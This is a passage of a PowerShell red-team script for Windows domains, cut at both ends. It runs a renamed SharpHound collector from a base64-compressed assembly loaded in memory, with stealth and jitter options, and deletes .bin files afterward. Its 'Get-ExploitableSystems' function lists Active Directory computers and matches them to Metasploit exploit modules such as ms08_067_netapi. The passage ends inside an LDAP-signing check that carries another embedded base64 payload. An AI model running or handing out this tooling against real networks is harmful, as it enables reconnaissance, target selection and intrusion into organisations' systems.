        [ValidateRange(0, 5)]
        [Int]
        $Verbosity,

        [Alias("h")]
        [Switch]
        $Help,

        [Switch]
        $Version
    )

    $vars = New-Object System.Collections.Generic.List[System.Object]

    if ($CollectionMethod)
    {
        $vars.Add("--CollectionMethods");
        foreach ($cmethod in $CollectionMethod)
        {
            $vars.Add($cmethod);
        }
    }

    if ($Domain)
    {
        $vars.Add("--Domain");
        $vars.Add($Domain);
    }
    
    if ($SearchForest)
    {
        $vars.Add("--SearchForest")    
    }

    if ($Stealth)
    {
        $vars.Add("--Stealth")
    }

    if ($LdapFilter)
    {
        $vars.Add("--LdapFilter");
        $vars.Add($LdapFilter);
    }

    if ($DistinguishedName)
    {
        $vars.Add("--DistinguishedName")
        $vars.Add($DistinguishedName)
    }
    
    if ($ComputerFile)
    {
        $vars.Add("--ComputerFile");
        $vars.Add($ComputerFile);
    }

    if ($OutputDirectory)
    {
        $vars.Add("--OutputDirectory");
        $vars.Add($OutputDirectory);
    }

    if ($OutputPrefix)
    {
        $vars.Add("--OutputPrefix");
        $vars.Add($OutputPrefix);
    }

    if ($CacheName)
    {
        $vars.Add("--CacheName");
        $vars.Add($CacheName);
    }

    if ($NoSaveCache)
    {
        $vars.Add("--MemCache");
    }

    if ($RebuildCache)
    {
        $vars.Add("--RebuildCache");
    }

    if ($RandomFilenames)
    {
        $vars.Add("--RandomFilenames");
    }

    if ($ZipFileName)
    {
        $vars.Add("--ZipFileName");
        $vars.Add($ZipFileName);
    }

    if ($NoZip)
    {
        $vars.Add("--NoZip");
    }

    if ($ZipPassword)
    {
        $vars.Add("--ZipPassword");
        $vars.Add($ZipPassword)
    }

    if ($TrackComputerCalls)
    {
        $vars.Add("--TrackComputerCalls")
    }

    if ($PrettyPrint)
    {
        $vars.Add("--PrettyPrint");
    }

    if ($LdapUsername)
    {
        $vars.Add("--LdapUsername");
        $vars.Add($LdapUsername);
    }

    if ($LdapPassword)
    {
        $vars.Add("--LdapPassword");
        $vars.Add($LdapPassword);
    }

    if ($DomainController)
    {
        $vars.Add("--DomainController");
        $vars.Add($DomainController);
    }
    
    if ($LdapPort)
    {
        $vars.Add("--LdapPort");
        $vars.Add($LdapPort);
    }
    
    if ($SecureLdap)
    {
        $vars.Add("--SecureLdap");
    }
    
    if ($DisableCertVerification) 
    {
        $vars.Add("--DisableCertVerification")    
    }

    if ($DisableSigning)
    {
        $vars.Add("--DisableSigning");
    }

    if ($SkipPortCheck)
    {
        $vars.Add("--SkipPortCheck");
    }

    if ($PortCheckTimeout)
    {
        $vars.Add("--PortCheckTimeout")
        $vars.Add($PortCheckTimeout)
    }

    if ($SkipPasswordCheck)
    {
        $vars.Add("--SkipPasswordCheck");
    }

    if ($ExcludeDCs)
    {
        $vars.Add("--ExcludeDCs")
    }

    if ($Throttle)
    {
        $vars.Add("--Throttle");
        $vars.Add($Throttle);
    }

    if ($Jitter -gt 0)
    {
        $vars.Add("--Jitter");
        $vars.Add($Jitter);
    }
    
    if ($Threads)
    {
        $vars.Add("--Threads")
        $vars.Add($Threads)
    }

    if ($SkipRegistryLoggedOn)
    {
        $vars.Add("--SkipRegistryLoggedOn")
    }

    if ($OverrideUserName)
    {
        $vars.Add("--OverrideUserName")
        $vars.Add($OverrideUsername)
    }
    
    if ($RealDNSName)
    {
        $vars.Add("--RealDNSName")
        $vars.Add($RealDNSName)
    }

    if ($CollectAllProperties)
    {
        $vars.Add("--CollectAllProperties")
    }

    if ($Loop)
    {
        $vars.Add("--Loop")
    }

    if ($LoopDuration)
    {
        $vars.Add("--LoopDuration")
        $vars.Add($LoopDuration)
    }

    if ($LoopInterval)
    {
        $vars.Add("--LoopInterval")
        $vars.Add($LoopInterval)
    }

    if ($StatusInterval)
    {
        $vars.Add("--StatusInterval")
        $vars.Add($StatusInterval)
    }

    if ($Verbosity)
    {
        $vars.Add("-v");
        $vars.Add($Verbosity);
    }    

    if ($Help)
    {
        $vars.clear()
        $vars.Add("--Help");
    }

    if ($Version)
    {
        $vars.clear();
        $vars.Add("--Version");
    }

    $passed = [string[]]$vars.ToArray()


	$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
	$UncompressedFileBytes = New-Object Byte[](1051648)
	$DeflatedStream.Read($UncompressedFileBytes, 0, 1051648) | Out-Null
	$Assembly = [Reflection.Assembly]::Load($UncompressedFileBytes)
	$BindingFlags = [Reflection.BindingFlags] "Public,Static"
	$a = @()
	$Assembly.GetType("Costura.AssemblyLoader", $false).GetMethod("Attach", $BindingFlags).Invoke($Null, @())
	$Assembly.GetType("Sharphound.Program").GetMethod("InvokeSharpHound").Invoke($Null, @(,$passed))
}

if ($jblood)
{
    Write-Host "Skipping BloodHound collection..." -ForegroundColor Yellow;
}
else{
    echo ""
	Write-Host "Running BloodHound Collector... " -ForegroundColor Cyan
    Outvoke-BloodHound -CollectionMethod All,GPOLocalGroup
    Write-Host "Done! " -ForegroundColor Green;
    echo " "
}

del .\*.bin

function Get-ExploitableSystems
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Credentials to use when connecting to a Domain Controller.")]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
        
        [Parameter(Mandatory=$false,
        HelpMessage="Domain controller for Domain and Site that you want to query against.")]
        [string]$DomainController,

        [Parameter(Mandatory=$false,
        HelpMessage="Maximum number of Objects to pull from AD, limit is 1,000.")]
        [int]$Limit = 1000,

        [Parameter(Mandatory=$false,
        HelpMessage="scope of a search as either a base, one-level, or subtree search, default is subtree.")]
        [ValidateSet("Subtree","OneLevel","Base")]
        [string]$SearchScope = "Subtree",

        [Parameter(Mandatory=$false,
        HelpMessage="Distinguished Name Path to limit search to.")]

        [string]$SearchDN
    )
    Begin
    {
        if ($DomainController -and $Credential.GetNetworkCredential().Password)
        {
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential.UserName,$Credential.GetNetworkCredential().Password
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }
        else
        {
            $objDomain = [ADSI]""  
            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        }
    }

    Process
    {


        Write-Host "[*] Grabbing computer accounts from Active Directory..."





    

        $TableAdsComputers = New-Object System.Data.DataTable 
        $TableAdsComputers.Columns.Add('Hostname') | Out-Null        
        $TableAdsComputers.Columns.Add('OperatingSystem') | Out-Null
        $TableAdsComputers.Columns.Add('ServicePack') | Out-Null
        $TableAdsComputers.Columns.Add('LastLogon') | Out-Null






        $CompFilter = "(&(objectCategory=Computer))"
        $ObjSearcher.PageSize = $Limit
        $ObjSearcher.Filter = $CompFilter
        $ObjSearcher.SearchScope = "Subtree"

        if ($SearchDN)
        {
            $objSearcher.SearchDN = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($SearchDN)")
        }

        $ObjSearcher.FindAll() | ForEach-Object {


            $CurrentHost = $($_.properties['dnshostname'])
            $CurrentOs = $($_.properties['operatingsystem'])
            $CurrentSp = $($_.properties['operatingsystemservicepack'])
            $CurrentLast = $($_.properties['lastlogon'])
            $CurrentUac = $($_.properties['useraccountcontrol'])




            $CurrentUacBin = [convert]::ToString($CurrentUac,2)


            $DisableOffset = $CurrentUacBin.Length - 2
            $CurrentDisabled = $CurrentUacBin.Substring($DisableOffset,1)


            if ($CurrentDisabled  -eq 0){


                $TableAdsComputers.Rows.Add($CurrentHost,$CurrentOS,$CurrentSP,$CurrentLast) | Out-Null 
            }            
 
         }


        Write-Host "[*] Loading exploit list for critical missing patches..."




    

        $TableExploits = New-Object System.Data.DataTable 
        $TableExploits.Columns.Add('OperatingSystem') | Out-Null 
        $TableExploits.Columns.Add('ServicePack') | Out-Null
        $TableExploits.Columns.Add('MsfModule') | Out-Null  
        $TableExploits.Columns.Add('CVE') | Out-Null
        

        $TableExploits.Rows.Add("Windows 7","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_070_wkssvc","http://www.cvedetails.com/cve/2006-4691") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/smb/ms05_039_pnp","http://www.cvedetails.com/cve/2005-1983") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008","Service Pack 2","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008 R2","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","Service Pack 2","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms05_039_pnp","http://www.cvedetails.com/cve/2005-1983") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_070_wkssvc","http://www.cvedetails.com/cve/2006-4691") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 3","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 3","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  

    


        Write-Host "[*] Checking computers for vulnerable OS and SP levels..."




        

        $TableVulnComputers = New-Object System.Data.DataTable 
        $TableVulnComputers.Columns.Add('ComputerName') | Out-Null
        $TableVulnComputers.Columns.Add('OperatingSystem') | Out-Null
        $TableVulnComputers.Columns.Add('ServicePack') | Out-Null
        $TableVulnComputers.Columns.Add('LastLogon') | Out-Null
        $TableVulnComputers.Columns.Add('MsfModule') | Out-Null  
        $TableVulnComputers.Columns.Add('CVE') | Out-Null   
        

        $TableExploits | 
        ForEach-Object {
                     
            $ExploitOS = $_.OperatingSystem
            $ExploitSP = $_.ServicePack
            $ExploitMsf = $_.MsfModule
            $ExploitCve = $_.CVE


            $TableAdsComputers | 
            ForEach-Object {
                
                $AdsHostname = $_.Hostname
                $AdsOS = $_.OperatingSystem
                $AdsSP = $_.ServicePack                                                        
                $AdsLast = $_.LastLogon
                

                if ($AdsOS -like "$ExploitOS*" -and $AdsSP -like "$ExploitSP" ){                    
                   

                    $TableVulnComputers.Rows.Add($AdsHostname,$AdsOS,$AdsSP,[dateTime]::FromFileTime($AdsLast),$ExploitMsf,$ExploitCve) | Out-Null 
                }

            }

        }     
        


        $VulnComputer = $TableVulnComputers | select ComputerName -Unique | measure
        $vulnComputerCount = $VulnComputer.Count
        If ($VulnComputer.Count -gt 0){


            Write-Host "[+] Found $vulnComputerCount potentially vulnerabile systems!"
            $TableVulnComputers | Sort-Object { $_.lastlogon -as [datetime]} -Descending

        }else{

            Write-Host "[-] No vulnerable systems were found."

        }      

    }

    End
    {

    }
}

if ($jexploitable)
{
    Write-Host "Skipping Exploitable Systems..." -ForegroundColor Yellow;
}
else{
    echo ""
	Write-Host "Looking for Exploitable Systems... " -ForegroundColor Cyan;
    Get-ExploitableSystems | Format-Table -AutoSize > $pwd\ExploitableSystems.txt
	type $pwd\ExploitableSystems.txt
    Write-Host "Done! " -ForegroundColor Green;
    echo " "
}


function Outvoke-LdapSignCheck
{

    [CmdletBinding()]
    Param (
        [String]
        $Command = "/H"

    )

    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("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